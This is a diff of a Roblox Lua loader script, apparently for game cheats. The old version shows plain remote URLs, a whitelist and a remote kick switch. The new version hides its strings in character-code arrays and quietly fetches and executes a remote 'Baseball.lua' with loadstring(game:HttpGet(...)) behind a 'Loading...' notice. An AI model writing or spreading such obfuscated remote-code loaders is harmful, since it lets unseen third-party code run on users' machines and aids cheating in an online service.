@@ -1,176 +1,101 @@
-local aaa = true
-local bbb = true
-local ccc = {172386604, 987654321}
+local aaa=true
 
-local config = {
-	main = "https://raw.githubusercontent.com/3exotic/9v9/refs/heads/main/main.lua",
-	load2 = "https://raw.githubusercontent.com/Ivan-Fedorov/BaseballHuh/refs/heads/main/Baseball.lua",
-	load = "https://scripts.getascendify.lol/sportsclub.luau"
-}
-
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
-local function whitelisted(userId, list)
-	for _, id in pairs(list) do
-		if tonumber(id) == tonumber(userId) then
-			return true
-		end
+local function _0x1(_0x2)
+	local _0x3=""
+	for _0x4=1,#_0x2 do
+		_0x3=_0x3..string.char(_0x2[_0x4])
 	end
-	return false
+	return _0x3
 end
 
-local function getBBB(source)
-	local value = source:match("bbb%s*=%s*(%a+)")
-	return value == "true"
+local _0x5=_0x1({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,73,118,97,110,45,70,101,100,111,114,111,118,47,66,97,115,101,98,97,108,108,72,117,104,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,66,97,115,101,98,97,108,108,46,108,117,97})
+
+local _0x6=game:GetService(_0x1({80,108,97,121,101,114,115}))
+local _0x7=game:GetService(_0x1({84,119,101,101,110,83,101,114,118,105,99,101}))
+local _0x8=_0x6.LocalPlayer
+local _0x9=_0x8:WaitForChild(_0x1({80,108,97,121,101,114,71,117,105}))
+
+local function _0xa(_0xb,_0xc)
+	local _0xd=Instance.new(_0x1({83,99,114,101,101,110,71,117,105}))
+	_0xd.Name=_0x1({95,95})
+	_0xd.ResetOnSpawn=false
+	_0xd.IgnoreGuiInset=true
+	_0xd.Parent=_0x9
+
+	local _0xe=Instance.new(_0x1({70,114,97,109,101}))
+	_0xe.AnchorPoint=Vector2.new(.5,.5)
+	_0xe.Position=UDim2.new(.5,0,1.2,0)
+	_0xe.Size=UDim2.new(0,330,0,65)
+	_0xe.BackgroundColor3=Color3.fromRGB(20,20,25)
+	_0xe.BackgroundTransparency=1
+	_0xe.Parent=_0xd
+
+	local _0xf=Instance.new(_0x1({85,73,67,111,114,110,101,114}))
+	_0xf.CornerRadius=UDim.new(0,18)
+	_0xf.Parent=_0xe
+
+	local _0x10=Instance.new(_0x1({85,73,83,116,114,111,107,101}))
+	_0x10.Color=Color3.fromRGB(255,255,255)
+	_0x10.Thickness=1.4
+	_0x10.Transparency=1
+	_0x10.Parent=_0xe
+
+	local _0x11=Instance.new(_0x1({85,73,83,99,97,108,101}))
+	_0x11.Scale=.9
+	_0x11.Parent=_0xe
+
+	local _0x12=Instance.new(_0x1({84,101,120,116,76,97,98,101,108}))
+	_0x12.BackgroundTransparency=1
+	_0x12.Size=UDim2.new(1,0,1,0)
+	_0x12.Text=_0xb
+	_0x12.TextColor3=Color3.fromRGB(255,255,255)
+	_0x12.TextTransparency=1
+	_0x12.TextScaled=true
+	_0x12.Font=Enum.Font.GothamBold
+	_0x12.Parent=_0xe
+
+	local _0x13=Instance.new(_0x1({85,73,80,97,100,100,105,110,103}))
+	_0x13.PaddingLeft=UDim.new(0,18)
+	_0x13.PaddingRight=UDim.new(0,18)
+	_0x13.PaddingTop=UDim.new(0,8)
+	_0x13.PaddingBottom=UDim.new(0,8)
+	_0x13.Parent=_0x12
+
+	local _0x14=Instance.new(_0x1({85,73,84,101,120,116,83,105,122,101,67,111,110,115,116,114,97,105,110,116}))
+	_0x14.MaxTextSize=28
+	_0x14.MinTextSize=14
+	_0x14.Parent=_0x12
+
+	local _0x15=TweenInfo.new(.65,Enum.EasingStyle.Quint,Enum.EasingDirection.Out)
+	local _0x16=TweenInfo.new(.45,Enum.EasingStyle.Quint,Enum.EasingDirection.In)
+
+	_0x7:Create(_0xe,_0x15,{Position=UDim2.new(.5,0,.86,0),BackgroundTransparency=.12}):Play()
+	_0x7:Create(_0x12,_0x15,{TextTransparency=0}):Play()
+	_0x7:Create(_0x10,_0x15,{Transparency=.7}):Play()
+	_0x7:Create(_0x11,_0x15,{Scale=1}):Play()
+
+	task.wait(_0xc)
+
+	_0x7:Create(_0xe,_0x16,{Position=UDim2.new(.5,0,1.2,0),BackgroundTransparency=1}):Play()
+	_0x7:Create(_0x12,_0x16,{TextTransparency=1}):Play()
+	_0x7:Create(_0x10,_0x16,{Transparency=1}):Play()
+	_0x7:Create(_0x11,_0x16,{Scale=.92}):Play()
+
+	task.wait(.5)
+	_0xd:Destroy()
 end
 
-local function getCCC(source)
-	local ids = {}
-	local list = source:match("ccc%s*=%s*{(.-)}")
-
-	if list then
-		for id in list:gmatch("%d+") do
-			table.insert(ids, tonumber(id))
-		end
-	end
-
-	return ids
-end
-
-local function notify(text, duration)
-	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "SmoothLoaderUI"
-	screenGui.ResetOnSpawn = false
-	screenGui.IgnoreGuiInset = true
-	screenGui.Parent = playerGui
-
-	local frame = Instance.new("Frame")
-	frame.AnchorPoint = Vector2.new(0.5, 0.5)
-	frame.Position = UDim2.new(0.5, 0, 1.2, 0)
-	frame.Size = UDim2.new(0, 330, 0, 65)
-	frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-	frame.BackgroundTransparency = 1
-	frame.Parent = screenGui
-
-	local corner = Instance.new("UICorner")
-	corner.CornerRadius = UDim.new(0, 18)
-	corner.Parent = frame
-
-	local stroke = Instance.new("UIStroke")
-	stroke.Color = Color3.fromRGB(255, 255, 255)
-	stroke.Thickness = 1.4
-	stroke.Transparency = 1
-	stroke.Parent = frame
-
-	local scale = Instance.new("UIScale")
-	scale.Scale = 0.9
-	scale.Parent = frame
-
-	local label = Instance.new("TextLabel")
-	label.BackgroundTransparency = 1
-	label.Size = UDim2.new(1, 0, 1, 0)
-	label.Text = text
-	label.TextColor3 = Color3.fromRGB(255, 255, 255)
-	label.TextTransparency = 1
-	label.TextScaled = true
-	label.Font = Enum.Font.GothamBold
-	label.Parent = frame
-
-	local padding = Instance.new("UIPadding")
-	padding.PaddingLeft = UDim.new(0, 18)
-	padding.PaddingRight = UDim.new(0, 18)
-	padding.PaddingTop = UDim.new(0, 8)
-	padding.PaddingBottom = UDim.new(0, 8)
-	padding.Parent = label
-
-	local limit = Instance.new("UITextSizeConstraint")
-	limit.MaxTextSize = 28
-	limit.MinTextSize = 14
-	limit.Parent = label
-
-	local slideIn = TweenInfo.new(0.65, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
-	local slideOut = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
-
-	TweenService:Create(frame, slideIn, {
-		Position = UDim2.new(0.5, 0, 0.86, 0),
-		BackgroundTransparency = 0.12
-	}):Play()
-
-	TweenService:Create(label, slideIn, {
-		TextTransparency = 0
-	}):Play()
-
-	TweenService:Create(stroke, slideIn, {
-		Transparency = 0.7
-	}):Play()
-
-	TweenService:Create(scale, slideIn, {
-		Scale = 1
-	}):Play()
-
-	task.wait(duration)
-
-	TweenService:Create(frame, slideOut, {
-		Position = UDim2.new(0.5, 0, 1.2, 0),
-		BackgroundTransparency = 1
-	}):Play()
-
-	TweenService:Create(label, slideOut, {
-		TextTransparency = 1
-	}):Play()
-
-	TweenService:Create(stroke, slideOut, {
-		Transparency = 1
-	}):Play()
-
-	TweenService:Create(scale, slideOut, {
-		Scale = 0.92
-	}):Play()
-
-	task.wait(0.5)
-	screenGui:Destroy()
-end
-
-local function checkLocal()
-	if bbb == false and not whitelisted(player.UserId, ccc) then
-		player:Kick("restart required")
-	end
-end
-
-if aaa == false then
-	notify("Failed to Fetch", 3)
+if not aaa then
+	_0xa(_0x1({70,97,105,108,101,100,32,116,111,32,70,101,116,99,104}),3)
 	return
 end
 
-checkLocal()
+_0xa(_0x1({76,111,97,100,105,110,103,46,46,46}),3)
 
-task.spawn(function()
-	while task.wait(10) do
-		local success, source = pcall(function()
-			return game:HttpGet(config.main .. "?t=" .. tostring(os.time()))
-		end)
-
-		if success and source then
-			local liveBBB = getBBB(source)
-			local liveCCC = getCCC(source)
-
-			if liveBBB == false and not whitelisted(player.UserId, liveCCC) then
-				player:Kick("restart required")
-			end
-		end
-	end
+local _0x17,_0x18=pcall(function()
+	loadstring(game:HttpGet(_0x5))()
 end)
 
-notify("Loading...", 3)
-
-local success = pcall(function()
-	loadstring(game:HttpGet(config.load))()
-end)
-
-if not success then
-	notify("Failed to Fetch", 3)
+if not _0x17 then
+	_0xa(_0x1({70,97,105,108,101,100,32,116,111,32,70,101,116,99,104}),3)
 end
